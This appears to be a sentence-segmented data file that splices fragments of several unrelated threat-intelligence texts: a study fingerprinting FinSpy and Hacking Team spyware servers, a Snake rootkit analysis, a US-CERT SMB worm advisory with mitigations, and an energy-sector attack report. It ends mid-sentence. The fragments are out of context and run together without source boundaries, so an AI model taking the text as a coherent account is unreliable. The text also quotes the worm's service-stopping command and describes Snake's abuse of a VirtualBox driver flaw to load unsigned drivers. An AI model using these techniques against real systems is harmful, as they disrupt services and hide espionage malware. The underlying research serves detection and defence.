"Be- cause the master served as a proxy for Google , we could uncover its IP address using a Google feature that prints a user 's IP address for the query '' IP address .", "6113": "'' We created an additional fingerprint based on the proxying behavior and is- sued GET /search ? q=ip+address & nord=1 requests to servers We note some interesting master locations in Table 4 .", "6114": "Server locations : In all , our fingerprints matched 92 dis- tinct IP addresses in 35 different countries .", "6115": "Probing these on 8/8/13 revealed 22 distinct addresses still responding , sited in : Bahrain , Bangladesh , Bosnia and Herzegovina , Estonia , Ethiopia , Germany , Hong Kong , Indonesia , Macedonia , Mex- ico , Romania , Serbia , Turkmenistan , and the United States .", "6116": "We found servers responding to a number of our fingerprints , sug- gesting either that some servers lag in their updates , or a con- certed effort to vary the behavior of FinSpy servers to make detection harder .", "6117": "We found : ( 1 ) 3 IP addresses in ranges registered to Gamma .", "6118": "( 2 ) Servers in 3 IP ranges explicitly registered to govern- ment agencies : Turkmenistan 's Ministry of Communications , Qatar 's State Security Bureau , and the Bulgarian Council of Ministers .", "6119": "( 3 ) 3 additional IP addresses in Bahrain , all in Batelco .", "6120": "( 4 ) Servers in 7 countries with governments classified as '' authoritarian regimes '' by The Economist : Bahrain , Ethiopia , Nigeria , Qatar , Turkmenistan , UAE , Vietnam .", "6121": "Additional FinSpy samples : In parallel to our scanning , we obtained 9 samples of FinSpy by writing YARA rules for the '' malware hunting '' feature of VirusTotal Intelligence .", "6122": "This feature sends us all newly-submitted samples that match our signatures .", "6123": "This did not appear to be an older or newer ver- sion of the protocol , suggesting that our scan results may not reveal the full scope of FinSpy C & C servers .", "6124": "Perhaps , the HTTP POST protocol was only delivered to a specific Gamma customer to meet a requirement .", "6125": "We began by analyzing the UAE RCS sample from Ahmed and 6 samples obtained from VirusTotal by searching for AV re- sults containing the strings '' DaVinci '' and '' RCS .", "6126": "'' At the time , several AV vendors had added detection for RCS based on a sample analyzed by Dr .", "6127": "Web and the UAE RCS sample sent to Ahmed .", "6128": "Based on these samples , we devised YARA signa- tures that yielded 23 additional samples of structurally similar malware .", "6129": "Fingerprints : We probed the C & C servers of the RCS and FSBSpy samples , and found that they responded in a distinc- tive way to HTTP requests , and returned distinctive SSL cer- tificates .", "6130": "We searched sources including Shodan , 5 Internet Census service probes , and Critical.IO scanning data for the observed distinctive HTTP behavior .", "6131": "We searched for the dis- tinctive SSL certificates in two Internet Census service probes , and SSL certificate scans from ZMap .", "6132": "We also contacted a team at TU Munich , who applied our fingerprints to their SSL scanning data .", "6133": "Across all of these sources , we obtained 31,345 indicator hits reflecting 555 IP addresses in 48 coun- tries .", "6134": "One SSL certificate returned by 175 of the servers was issued by '' /CN=RCS Certification Authority /O=HT srl , '' apparently referring to the name of the spyware and the company .", "6135": "Servers for 5 of our FSBSpy samples and 2 of our RCS samples re- sponded with this type of certificate .", "6136": "Some servers returned these certificates in chains that in- cluded another distinctive certificate .", "6137": "We found 175 distinct IP addresses ( including the C & C 's for 5 of our FSBSpy samples and 2 of our RCS samples ) responded with this second type of certificate .", "6138": "We devised two more indicators : one that matched 125 IP addresses , including 7 of our FSBSpy samples ' C & C 's , and one that matched 2 IP addresses , in Italy and Kazakhstan .", "6139": "Server locations : On 11/4/13 we probed all of the IP ad- dresses that we collected , finding 166 active addresses match- ing one of our fingerprints in 29 different countries .", "6140": "We sum- marize the top providers and countries in Table 5 .", "6141": "The prevalence of active servers either located in the USA or hosted by Linode is striking , and seems to indicate a pervasive use of out-of-country web hosting and VPS services .", "6142": "In addition , we found : ( 1 ) 3 IP addresses on a /28 named '' HT public subnet '' that is registered to the CFO of Hacking Team .", "6143": "The domain hackingteam.it resolves to an address in this range .", "6144": "( 2 ) An address belonging to Omantel , a majority-state-owned telecom in Oman .", "6145": "( 3 ) 7 IP addresses belonging to Maroc Telecom .", "6146": "Moroccan journal- ists at Mamfakinch.com were previously targeted by RCS in 2012 .", "6147": "( 4 ) Overall , servers in 8 countries with governments deemed '' authoritarian regimes '' : Azerbaijan , Kazakhstan , Nigeria , Oman , Saudi Arabia , Sudan , UAE , Uzbekistan .", "6148": "Link to Hacking Team : All active servers match- ing one of our signatures also responded peculiarly when queried with particular ill-formed HTTP requests , respond- ing with '' HTTP1/1 400 Bad request '' ( should be '' HTTP/1.1 '' ) and a body of '' Detected error : HTTP code 400 '' .", "6149": "Googling for this response yielded a GitHub project em-http-server , a Ruby-based webserver .", "6150": "The project 's author is listed as Alberto Ornaghi , a software architect at Hacking Team .", "6151": "We suspect that the Hacking Team C & C server code may incorporate code from this project .", "6152": "Links between servers : We identified many cases where several servers hosted by different providers , and in different countries , returned identical SSL certificates matching our fin- gerprints .", "6153": "We also observed 30 active servers used a global IPID .", "6154": "Only one active server had neither a global IPID nor an SSL certificate matching our fingerprints .", "6155": "We assessed whether servers returning SSL certificates were forwarding to the servers with global IPIDs by inducing bursts of traffic at the former and monitoring the IPID at the latter .", "6156": "For 11 servers , we found that the server 's activity correlated to bursts sent to other servers .", "6157": "There was a 1:1 mapping between the remaining 8 addresses and groups .", "6158": "We refer to a group along with the server ( s ) it forwards to as a server group .", "6159": "We identified several server groups that may be associated with victims or operators in a certain country .", "6160": "Some of these suggest possible further investigation : Turkey : We identified a group containing 20 servers in 9 countries .", "6161": "We ex- clusively received RCS traffic from Turkish IP addresses .", "6162": "( RCS traffic is identifiable based on a distinctive user agent and URL in POST requests .", "6163": "In the above cases , save Turkey , the country we have identi- fied is classified as an '' authoritarian regime , '' and may be using Hacking Team products against the types of targets we profile in this paper .", "6164": "In the case of Turkey , there are hints that the tool may be employed against dissidents .", "6165": "Targeted surveillance of individuals conducted by nation-states poses an exceptionally challenging security problem , given the great imbalance of resources and expertise between the victims and the attackers .", "6166": "We have sketched the nature of this problem space as reported to us by targeted individuals in three Middle Eastern countries .", "6167": "In- stead , they employ prepackaged tools developed by vendors or acquired from the cybercrime underground .", "6168": "This technol- ogy sometimes suffers from what strike us as amateurish mis- takes ( multiple serious errors implementing cryptography , bro- ken protocol messages ) , as does the attackers ' employment of it ( identifying-information embedded in binaries , C & C servers discoverable via scanning or '' Google hacking '' , clusters of at- tack accounts tied by common activity ) .", "6169": "Some of these errors assisted our efforts to assemble strong circumstantial evidence of governmental origins .", "6170": "In addition , we mapped out the global use of two '' governmental '' hacking suites , including identify- ing 11 cases in which they appeared to be used in countries governed by '' authoritarian regimes .", "6171": "'' We aim with this work to inspire additional research efforts addressing the difficult problem of how to adequately protect individuals with very limited resources facing very powerful adversaries .", "6172": "Open questions include robust , practical detection of targeted attacks designed to exfiltrate data from a victim's computer , as well as detection of and defense against novel at- tack vectors , like tampering with Internet connections to insert malware .", "6173": "The task is highly challenging , but the potential stakes are likewise very high .", "6174": "An opposition member , reflecting on gov- ernment hacking in Libya , speculated as to why some users would execute files even while recognizing them as potentially malicious : '' If we were vulnerable we could n't care less .", "6175": ".", "6176": ".", "6177": "we were desperate to get our voices out .", "6178": ".", "6179": ".", "6180": "it was a matter of life or death .", "6181": ".", "6182": ".", "6183": "it was just vital to get this information out .", "6184": "'' This work was supported by the National Science Foundation under grants 1223717 and 1237265 , and by a Citizen Lab Fel- lowship .", "6185": "Any opinions , findings , and conclusions or recom- mendations expressed in this material are those of the authors and do not necessarily reflect the views of the sponsors .", "6186": "The authors would like to thank the following individuals for their help in various aspects of our analysis : Bernhard Am- man , Collin D. Anderson , Brandon Dixon , Zakir Durumeric , Eva Galperin , Claudio Guarnieri , Drew Hintz , Ralph Holz , Shane Huntley , Andrew Lyons , Mark Schloesser , and Nicholas Weaver .", "6187": "Previous work by Guarnieri on scanning for FinSpy servers found that in response to a request such as GET / , the Bahraini FinSpy C & C server returns a response with the string '' Hallo Steffi '' .", "6188": "Guarnieri searched a database of such responses compiled by the Critical.IO Internet scanning project , locating 11 additional servers in 10 countries .", "6189": "We refer to this fingerprint as \u03b11 .", "6190": "Concurrent with this ef- fort , we devised our own fingerprint \u03b21 that tested three as- pects of the handshake between a FinSpy infectee and a Fin- Spy C & C server , which follows a custom TLV-based protocol running on ports such as 22 , 53 , 80 , and 443 .", "6191": "We conducted targeted scanning of several countries using \u03b21 , and also con- firmed Guarnieri 's findings for those servers still reachable af- ter he published his findings .", "6192": "We observed a trend : changes in HTTP response behavior by FinFisher after publication of findings about the software .", "6193": "In July 2012 , for example , after a post about Bahraini FinSpy samples , servers closed the TCP connection in response to a GET / or HEAD / request ( although servers continued to behave consistently with \u03b21 .", "6194": "Other changes followed later in 2012 , including a new response to GET / requests that in- cluded an imperfect copy of an Apache server 's HTTP response ( the Date header used UTC rather than GMT ) .", "6195": "We fingerprinted this error as \u03b12 , and later in 2012 fingerprinted other distinctive behavior in response to GET / requests as \u03b13 .", "6196": "Subsequent scans of /0 for \u03b12 and \u03b13 , and five service probes of the Internet Census for \u03b11 through \u03b13 , located several additional servers .", "6197": "In Feburary 2013 we identified and finger- printed new HTTP response behavior with \u03b14 and modified \u03b21 to produce \u03b22 , which tests only two of the three aspects of the FinSpy handshake ( the third test of \u03b21 was broken when Fin- Spy servers were updated to accept types of invalid data they had previously rejected ) .", "6198": "As of 3/13/13 , all servers that matched any \u03b1 fingerprint matched \u03b22 .", "6199": "One of the questions which comes up in the months after big security whitepaper disclosures is : where are they now ? In other words , what happened to the operators , tools , and infrastructure which was revealed in the reports , blog-posts , and press interviews .", "6200": "Did they continue on as before , did they re-build the disclosed infrastructure and tools , did they go away and get jobs in another line of work ? In some cases , the disclosure had little , if any impact on the operation .", "6201": "For example , after the McAfee ShadyRAT report in 2011 , there was absolutely no change in the attacks from the group behind this .", "6202": "However , when Mandiant released their APT1 report in 2013 , there was a noticeable reduction in activity from the group \u2013 and much of the tools and infrastructure has not been seen since .", "6203": "In the September 2010 issue of Foreign Affairs magazine , former US Deputy Secretary of Defense William J. Lynn discussed a cyber-attack which happened two years previously on the DoD's classified computer networks .", "6204": "Lynn described how a foreign intelligence agency planted malicious code on the networks with the aim of transferring data to servers under their control .", "6205": "The article included the now oft-quoted phrase 'digital beachhead ' to describe what was undoubtedly a significant compromise of US military systems .", "6206": "Further reports in the press kept the story alive in 2011 , but since then this threat has received remarkably little attention .", "6207": "However , the operation behind the attacks has continued with little modification to the tools and techniques , in spite of the widespread attention a few years ago .", "6208": "There are some threats which come and go , whilst there are others which are permanent features of the landscape .", "6209": "In this paper , we describe the tools and techniques of one of the most sophisticated and persistent threats we track .", "6210": "We hope this will help victims identify intrusions and understand their need to improve defences .", "6211": "Cyber security is a collaborative effort \u2013 the operation described in this paper again raises the bar for the security community in their efforts to keep up with the attackers in cyber-space .", "6212": "When antivirus back-end classification platforms can not identify a malware family for an analysed malicious sample , they assign generic names , such as '' Trojan Horse '' or '' Agent '' .", "6213": "The variant letters are also assigned automatically , by using hexavigesimal ( or Base26 ) notation .", "6214": "That is , the variant letters are auto-assigned starting from '' A '' , followed with '' B '' , and so on until '' Z '' .", "6215": "Next comes '' AA '' , '' AB '' and so on , until '' ZZ '' .", "6216": "After that , the variant letters start from '' AAA '' , '' AAB '' and so on , until '' ZZZ '' .", "6217": "Back in 2008 an unknown malicious file was discovered and auto-classified as '' Agent.BTZ '' , meaning it was registered as unknown malicious sample # 1,898 in an anti-virus classification system .", "6218": "It was n't given an actual name , only a generic one .", "6219": "Meanwhile , internally the authors behind this malware were using their own naming systems - with specific titles for their file components and projects such as '' snake '' , '' uroburos '' , '' sengoku '' , and '' snark '' used to denote variants of their framework .", "6220": "A recent report from German security company GData described a sample from the '' uroburos '' variant of this framework .", "6221": "Their report revealed the complex nature of this malware family , and showed that the operation behind '' Agent.BTZ '' has continued .", "6222": "As a result of this disclosure , we are also releasing our own technical analysis of the threat , including a timeline of known samples , known Command-and-Control ( C & C ) servers , and other indicators to aid investigators in discovering attacks .", "6223": "Reverse engineering of recent malware samples shows these to be much more advanced variants of Agent.BTZ , though still sharing many similarities and encryption methods with the original .", "6224": "Further investigation allowed us to locate related samples compiled between 2006 and 2014 , and spanning across several distinctive generations .", "6225": "The first section of this report gives an overview of the samples collected , where they were reported and the timelines derived from their analysis .", "6226": "Snake 's architecture turned out to be quite interesting .", "6227": "In general , its operation relies on kernel mode drivers , making it a rootkit .", "6228": "At the same time , Snake exposed a flexibility to conduct its operations by engaging these noticeably different architectures .", "6229": "the area of the computer system where application software executes .", "6230": "the area where lower level system code such as device drivers run .", "6231": "In both architectures , there is both 32-bit and 64-bit code involved .", "6232": "In order to distinguish between these architectures , we will call them the usermode-centric and the kernel-centric architectures respectively .", "6233": "The remainder of this report gives a detailed explanation of how the two Snake architectures embed themselves in the target system and communicate with the outside world .", "6234": "We have also provided a set of technical indicators in the Appendix to enable organisations and the security research community to identify compromises .", "6235": "In total we have collected over 100 unique files related to this espionage toolkit .", "6236": "Many of these were submitted to online malware analysis websites by victims and investigators over several years .", "6237": "In many cases the source country information of the submission is available .", "6238": "These allow us to visualise the distribution of countries where this malware has been seen : Whilst this view is likely to only be the tip of the iceberg , it does give us an initial insight into the profile of targets for the Snake operations .", "6239": "Other useful visualisations of the operations come from the compile timestamps .", "6240": "Below is shown a table with a count of the number of files in our sample set from recent years .", "6241": "Two samples compiled in late January 2014 show that this activity is ongoing .", "6242": "Plotting the day of the week in which the samples were compiled shows a now familiar pattern for analysts of modern cyber-attacks .", "6243": "The creators of the malware operate a working week , just like any other professional .", "6244": "The single sample in our set which was compiled on a Saturday is an outlier , but does n't alter the conclusion .", "6245": "Similarly , plotting the hour of the day in which the samples were compiled reveals another human pattern \u2013 the working day .", "6246": "This has been adjusted to UTC+4 to show a possible fit to the operators ' local time .", "6247": "The usermode-centric architecture of Snake is known to have been used from 2011 till 2014 , with the most recent sample compiled on January 28 , 2014 .", "6248": "One of the analysed samples exposed multiple debug messages and source control check-in logs .", "6249": "It is not clear why those messages were allowed in the deployed driver - possibly an operational security lapse .", "6250": "However , they give some insight into the internal structure of the source code .", "6251": "For example , the analysed driver gave away the following source file names : The source control check-in log examples , showing the names of the developers to be 'vlad ' and 'gilg ' : It also exposed the project name of this particular variant as 'sengoku ' : Now it 's time to execute the driver and see what it does .", "6252": "By communicating from within a process that also communicates , even a technically savvy user will find it challenging to detect Snake traffic among legitimate traffic .", "6253": "The reason behind such difficulty is because modern web pages often fetch pages from the different web servers , including such data as additional scripts , CSS templates , advertising contents , analytics data , blogs , social networking data , etc .", "6254": "When intercepted with the purpose of analysis , such traffic may literally represent itself hundreds of DNS and HTTP requests made when a popular website , such as a news website is open .", "6255": "In order to test Snake 's communications with the C & C servers , and still being able to clearly distinguish its traffic , a small tool was built to generate GET request to a web server running on the analysed system .", "6256": "The tool was named as chrome.exe in order to trigger the malware communications .", "6257": "As long as the test tool named chrome.exe did not make any requests , its memory stayed pristine .", "6258": "There were no injections made by the driver .", "6259": "For example , Snake 's home directory could be C : \\WINDOWS\\ $ NtUninstallQ812589 $ .", "6260": "Memory pipes is a common mechanism for Inter-Process Communications ( IPC ) .", "6261": "When the pipe server reads such requests from the pipes , it performs the web request on behalf of a client by using WinINet APIs , so it effectively serves as a proxy .", "6262": "Pipe server is a special mode of the injected DLL .", "6263": "In its communication protocol with the driver it uses the IOCTL code of 0x222038 .", "6264": "However , the data appears to be defined in the structures , so it is very likely the DLL could be generated by a stand-alone builder that 'patches ' the DLL with the new/updated list of C & C .", "6265": "by using the reconnaissance tool that is explained later ) .", "6266": "The dropper itself is 32-bit , so it will run both on 32-bit and 64-bit Windows OS ( in WoW64 mode ) .", "6267": "For example , some samples exposed these filenames : fdisk32.sys , A0009547.sys , or Ultra3.sys .", "6268": "The filename of the dropper could be rknginst.exe or fdiskmon.exe .", "6269": "Once executed , the driver first makes sure it is registered under a pre-defined name , such as Ultra3 .", "6270": "Other samples may have a different registration name , such as ~ROOT .", "6271": "TDI is considered deprecated and will be removed in future versions of Microsoft Windows , but it 's still supported on Windows 7 .", "6272": "TCP/IP ) .", "6273": "For SMTP traffic , it communicates back normal SMTP server responses , such as '' 250 Sender OK '' , '' 503 Bad sequence of commands '' , etc .", "6274": "Another opportunity this mode unlocks is a peer-to-peer network mode with no centralised C & C .", "6275": "The infected hosts are capable of transferring the following peer-2-peer commands defining fragment size , reliability parameters , new peer information , peer impersonation flags , etc .", "6276": "Thus , it is not possible to reveal the contents of the Snake 's volume by accessing the contents of this file ( unless the encryption is broken , that is ) .", "6277": "Enlisting the contents of the created volume is possible , along with creating files on it : However , as soon as IofCallDriver ( ) hook is removed , the same 'dir ' command will fail , as with no hook the rootkit can not decrypt the scrambled volume : The second volume \\\\.\\Hd2 is not mapped to a file , so when a computer is switched off , its contents is lost .", "6278": "Thus , it could be used as a temporary or a cache storage .", "6279": "to pass commands , configuration parameters , binary images of additional Snake components .", "6280": "The 64-bit version of Snake must deal with a number of additional security protections implemented in 64-bit editions of Microsoft Windows , the most significant of which are kernel driver signature validation and Kernel Patch Protection ( more commonly known as PatchGuard ) .", "6281": "PatchGuard is a feature of 64-bit Windows which aims to prevent modification of the Windows kernel , something that is often performed by malware attempting to hide itself on an infected system .", "6282": "Although PatchGuard is successful at preventing kernel patching once initialised , several published bypass approaches exist , .", "6283": "The technique used by Snake appears to be similar to these approaches .", "6284": "The driver signing policy enforced by all 64-bit versions of Windows from Vista onwards requires all kernel-mode drivers to be signed with a valid digital signature .", "6285": "Does it resort to using bootkit technology , which has been used in the past to bypass protections to load unsigned 64-bit drivers ? The answer : No .", "6286": "Bootkits must overwrite the Master Boot Record ( MBR ) and antivirus products are well trained to catch that kind of bad behavior .", "6287": "The masterminds behind Snake rootkit seem to be well aware of this so what they resorted to instead is leveraging a vulnerability in a well-known virtualization product called VirtualBox , a product made by Oracle which is widely used by researchers to analyse malware .", "6288": "VirtualBox driver version 1.6.2 was released in June 2 , 2008 .", "6289": "Two months later , in August 2008 , security researchers reported that its main driver component , which is signed under the entity '' innotek Gmbh '' , contained a privilege escalation vulnerability .", "6290": "In a nutshell , the VirtualBox software installs a driver called VBoxDrv .", "6291": "The driver is controlled with the Input/Ouput Control Codes ( 32-bit values called IOCTL ) passed along DeviceIoControl ( ) API .", "6292": "One of the documented transfer methods that the system uses to pass data between the caller of DeviceIoControl ( ) API and the driver itself is called METHODNEITHER .", "6293": "As per MSDN documentation , METHODNEITHER is a special transfer type when Input/Output Request Packet ( IRP ) supplies the user-mode virtual addresses of the input and output buffers , without validating or mapping them .", "6294": "It is the responsibility of the driver to validate the addresses sent from user mode in order to make sure those addresses are valid usermode addresses .", "6295": "The source code of the vulnerable driver ( shown below ) demonstrates how the integer value of the rc variable is first derived from the input parameters pDevObj ( device object ) and pIrp ( request packet ) .", "6296": "Next , that integer value is written into the UserBuffer - an arbitrary address , pointed by the input parameter pIrp ( request packet ) .", "6297": "This variable is used within the function SepInitializeCodeIntegrity ( ) , implemented within CI.dll 's function CiInitialize ( ) and imported by the NT core ( ntoskrnl.exe ) .", "6298": "These exploits are bundled within the dropper in its resource section as executable files .", "6299": "As seen from the check-in logs found within one of the recent samples , the time span covers almost 6 years from January 2007 till December 2012 , which is aligned with the first reports of Agent.BTZ .", "6300": "Other similarities include the usage of the virtual partition \\\\.\\Vd1 , the temporary file named FA.tmp , usage of files named mswmpdat.tlb , wmcache.nld , winview.ocx .", "6301": "The cyber-espionage operation behind the Snake rootkit is well established , a sample comiled in January 2006 indicates that the activity would have begun in at least 2005 .", "6302": "Toolmarks left behind by the authors 'vlad ' & 'gilg ' , leave tantalizing clues as to the personas behind this .", "6303": "From a technical perspective , Snake demonstrates two very different approaches to the task of building a cyber-espionage toolkit .", "6304": "The complexity of the usermode-centric approach is on par with Rustock rootkit - it uses similar techniques .", "6305": "It 's an old well-polished technology that evolved over the years and demonstrated its resilience and survivability under the stress of security counter- measures .", "6306": "The complexity of the kernel-centric architecture of Snake is quite unique .", "6307": "This architecture is designed to grant Snake as much flexibility as possible .", "6308": "We expect much more will be uncovered by researchers in the coming weeks as the capabilities of this operation are further fleshed out .", "6309": "However , as we implied in the opening section , we view this threat to be a permanent feature of the landscape .", "6310": "Whether they dismantle this toolset and start from scratch , or continue using tools which have been exposed , remains to be seen .", "6311": "For their targets though the considerable challenge of keeping secrets safe on sensitive networks will certainly continue for years to come .", "6312": "Original release date : December 19 , 2014 Microsoft Windows US-CERT was recently notified by a trusted third party of cyber threat actors using a Server Message Block ( SMB ) Worm Tool to conduct cyber exploitation activities recently targeting a major entertainment company .", "6313": "Listening Implant : During installation of this tool , a portion of the binaries is decrypted using AES , with a key derived from the phrase '' National Football League .", "6314": "This special message is not preceded with a length or XOR encoded .", "6315": "There are no callback domains associated with this malware since connections are inbound only on a specified port number .", "6316": "The implant may have an associated configuration file which can contain a configurable port .", "6317": "Hostname , username , and password are then obtained from the configuration file .", "6318": "Technical and strategic mitigation recommendations are included in the Solution section below .", "6319": "US-CERT recommends reviewing the Security Tip Handling Destructive Malware # ST13-003 .", "6320": "Cyber threat actors are using an SMB worm to conduct cyber exploitation activities .", "6321": "Due to the highly destructive functionality of this malware , an organization infected could experience operational impacts including loss of intellectual property and disruption of critical systems .", "6322": "Users and administrators are recommended to take the following preventive measures to protect their computer networks : Use and maintain anti-virus software \u2013 Anti-virus software recognizes and protects your computer against most known viruses .", "6323": "It is important to keep your anti-virus software up-to-date ( see Understanding Anti-Virus Software for more information ) .", "6324": "Keep your operating system and application software up-to-date \u2013 Install software patches so that attackers ca n't take advantage of known problems or vulnerabilities .", "6325": "Many operating systems offer automatic updates .", "6326": "If this option is available , you should enable it ( see Understanding Patches for more information ) .", "6327": "Review Security Tip Handling Destructive Malware # ST13-003 and evaluate their capabilities encompassing planning , preparation , detection , and response for such an event .", "6328": "Review Recommended Practices for Control Systems , and Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies ( pdf ) .", "6329": "The following is a list of the Indicators of Compromise ( IOCs ) that can be added to network security solutions to determine whether they are present on a network .", "6330": "The malware has the following characteristics : While the original filename of this file is unknown , it was likely '' diskpartmg16.exe '' .", "6331": "It contains what appear to be hostnames , IP addresses , and the number 2 .", "6332": "Entries in the file have the structure '' HOSTNAME | IP Address | 2 '' .", "6333": "These copies are named according to the format '' taskhostXX.exe '' ( where X is a randomly generated ASCII character ) .", "6334": "The following command-line string is then executed : '' cmd.exe /c net stop MSExchangeIS /y '' .", "6335": "This SYS file is a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000 , XP , 2003 , Vista , 2008 ( 32-bit ) .", "6336": "This SYS file is a also a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000 , XP , 2003 , Vista , 2008 ( 64-bit ) .", "6337": "A summary of the C2 IP addresses : Snort signatures : Listening Implant : Lightweight Backdoor : Proxy Tool : Malware associated with the cyber threat actor : Below are potential YARA signatures to detect malware binaries on host machines : Because of the highly destructive functionality of the malware , an organization infected with the malware could experience operational impacts including loss of intellectual property ( IP ) and disruption of critical systems .", "6338": "Actual impact to organizations may vary depending on the type and number of systems impacted .", "6339": "Implement the indicators of compromise within your systems for detection and mitigation purposes .", "6340": "Encourage users to transfer critical files to network shares , to allow for central backed up .", "6341": "Execute daily backups of all critical systems .", "6342": "Periodically execute an '' offline '' backup of critical files to removable media .", "6343": "Establish emergency communications plans should network resources become unavailable .", "6344": "Isolate any critical networks ( including operations networks ) from business systems .", "6345": "Identify critical systems and evaluate the need for having on-hand spares to quickly restore service .", "6346": "Ensure antivirus is up to date .", "6347": "Disable credential caching for all desktop devices with particular importance on critical systems such as servers and restrict the number of cached credential for all portable devices to no more than three if possible .", "6348": "This can be accomplished through a Group Policy Object ( GPO ) .", "6349": "Disable AutoRun and Autoplay for any removable media device .", "6350": "Prevent or limit the use of all removable media devices on systems to limit the spread or introduction of malicious software and possible exfiltration data , except where there is a valid business case for use .", "6351": "This business case must be approved by the organization Chief IT Security Officer , with policy/guidance on how such media should be used .", "6352": "Consider restricting account privileges .", "6353": "It is our recommendation that all daily operations should be executed using standard user accounts unless administrative privileges are required for that specific function .", "6354": "Configure all standard user accounts to prevent the execution and installation of any unknown or unauthorized software .", "6355": "Both standard and administrative accounts should have access only to services required for nominal daily duties , enforcing the concept of separation of duties .", "6356": "Lastly , disable Web and email capabilities on administrative accounts .", "6357": "Compromise of admin accounts is one vector that allows malicious activity to become truly persistent in a network environment .", "6358": "Ensure that password policy rules are enforced and Admin password values are changed periodically .", "6359": "Consider prohibiting hosts within the production environment or DMZ from sharing an Active Directory enterprise with hosts on other networks .", "6360": "Each environment should have separate forests within Active Directory , with no trust relationships allowed between the forests if at all possible .", "6361": "If necessary , the trust relationships should be one-way with the low integrity environment trusting the higher integrity environment .", "6362": "Consider deployment of a coaching page with click through acceptance ; these are traditionally deployed in an environment to log the acceptance of network acceptable use policy or to notify users of monitoring .", "6363": "Coaching pages also provide some measure of protection from automated malicious activity .", "6364": "This occurs because automated malware is normally incapable of physically clicking an acceptance radial button .", "6365": "Automated malware is traditionally hardcoded to execute , then retrieve commands or additional executables from the Internet .", "6366": "If the malware is unable to initiate an active connection , the full train of infection is potentially halted .", "6367": "The danger still exists that the physical user will authorize access , but through the use of coaching pages , infections can be limited or at least the rate of infection reduced .", "6368": "Monitor logs -- Maintain and actively monitor a centralized logging solution that keeps track of all anomalous and potentially malicious activity .", "6369": "Ensure that all network operating systems , web browsers , and other related network hardware and software remain updated with all current patches and fixes .", "6370": "Organizations should review Security Tip Handling Destructive Malware # ST13-003 and evaluate their capabilities encompassing planning , preparation , detection , and response for such an event .", "6371": "Always keep your patch levels up to date , especially on computers that host public services accessible through the firewall , such as HTTP , FTP , mail , and DNS services .", "6372": "Build host systems , especially critical systems such as servers , with only essential applications and components required to perform the intended function .", "6373": "Any unused applications or functions should be removed or disabled , if possible , to limit the attack surface of the host .", "6374": "Implement network segmentation through V-LANs to limit the spread of malware .", "6375": "Consider the deployment of Software Restriction Policy set to only allow the execution of approved software ( application whitelisting ) .", "6376": "Recommend the whitelisting of legitimate executable directories to prevent the execution of potentially malicious binaries .", "6377": "Consider the use of two-factor authentication methods for accessing privileged root level accounts or systems .", "6378": "Consider deploying a two-factor authentication through a hardened IPsec/VPN gateway with split-tunneling prohibited for secure remote access .", "6379": "Deny direct Internet access , except through the use of proxies for Enterprise servers and workstations .", "6380": "Perform regular content filtering at the proxies or external firewall points of presence .", "6381": "Also consider the deployment of an explicit versus transparent proxy policy .", "6382": "Implement a Secure Socket Layer ( SSL ) inspection capability to inspect both ingress and egress encrypted network traffic for potential malicious activity .", "6383": "Isolate network services , such as email and Web application servers by utilizing a secure multi-tenant virtualization technology .", "6384": "This will limit the damage sustained from a compromise or attack of a single network component .", "6385": "Implement best practice guidance and policy to restrict the use of non-Foundation assets for processing or accessing Foundation-controlled data or systems ( e.g. , working from home , or using a personal device while at the office ) .", "6386": "It is difficult to enforce corporate policies , detect intrusions , and conduct forensic analysis or remediate compromises on non-corporate owned devices .", "6387": "Minimize network exposure for all control system devices .", "6388": "Control system devices should not directly face the Internet .", "6389": "Place control system networks behind firewalls , and isolate or air gap them from the business network .", "6390": "When remote access is required , use secure methods , such as Virtual Private Networks ( VPNs ) , recognizing that VPN is only as secure as the connected devices .", "6391": "Industrial Control System ( ICS ) -CERT and US-CERT remind organizations to perform proper impact analysis and risk assessment prior to taking defensive measures .", "6392": "N/A December 19 , 2014 : Initial Release", "6393": "The energy sector has become a major focus for targeted attacks and is now among the top five most targeted sectors worldwide .", "6394": "Companies in the sector are facing a growing risk of having their services interrupted or losing data .", "6395": "The threat to energy firms is only likely to increase in the coming years as new developments , such as further extensions of smart grids and smart metering expose more infrastructure to the Internet .", "6396": "Equipment that is not connected to the Internet and other networks is not immune to threats and there has already been a number of successful attacks against isolated systems .", "6397": "Operators of critical infrastructure , as well as energy utility companies , need to be aware of these threats and prepare accordingly .", "6398": "The threat to energy firms comes from several different sources .", "6399": "In some cases , espionage from competitors is the primary motive , with data on new projects , exploration and finances being targeted .", "6400": "Disruption and destruction are the goals of other attacks .", "6401": "Some instances appear to be state sponsored , such as the disruption of the Iranian nuclear program by the Stuxnet worm in 2010 , one of the attacks that began this trend .", "6402": "Others appear to be the work of hacktivists with political or environmental agendas .", "6403": "Internal attackers , like disgruntled employees , are also a major source of attacks that often lead to service disruption .", "6404": "The majority of the actors behind these attacks have grown more sophisticated in the way they attack .", "6405": "During the monitoring period from July 2012 to June 2013 , we observed an average of 74 targeted attacks per day globally .", "6406": "Of these , nine attacks per day targeted the energy sector .", "6407": "Accounting for 16.3 percent of all attacks , the energy sector was the second most targeted vertical in the last six months of 2012 , with only the government/public sector exceeding it with 25.4 percent of all attacks .", "6408": "The high ranking was mainly due to a major attack against a global oil company , which we observed in September 2012 .", "6409": "However , in the first half of 2013 the energy sector continued to attract a high proportion of attacks , ranking in fifth place with 7.6 percent of targeted attacks .", "6410": "Not all of the attacks analyzed used highly sophisticated tools .", "6411": "Most of them could have been prevented by following best practice guidelines for protecting the IT infrastructure and the industrial components , indicating that despite high revenues and strategic importance , many energy sector companies are not prioritizing cybersecurity .", "6412": "The number of targeted cyberattacks in general has risen in the past few years .", "6413": "In addition to this , the rate of attack exposure has also risen , with more companies becoming aware of attacks , expecting them and searching for indications of compromise .", "6414": "It is not a new phenomenon , but its importance has grown .", "6415": "The Council on Foreign Relations , a US think tank , reported that energy companies , including oil and gas producers , were often the focus of targeted attacks during summer 2012 .", "6416": "In May 2013 the US Department of Homeland Security ( DHS ) warned of an increase in sabotage attacks against US energy companies located in the Middle East .", "6417": "The government had tracked multiple attacks and issued a warning together with the Industrial Control Systems Cyber Emergency Response Team ( ICS-CERT ) .", "6418": "A report by the US Congress supported this picture , stating that many power utilities companies were under constant or daily attack through cyberspace .", "6419": "Taking into account that successful breaches of critical infrastructures are still rare and that these numbers included generic malware infections , it nevertheless highlights the potential for cyberattacks in the energy sector .", "6420": "As in most sectors , attackers are often after valuable information .", "6421": "For example , we have seen attackers target intellectual property such as 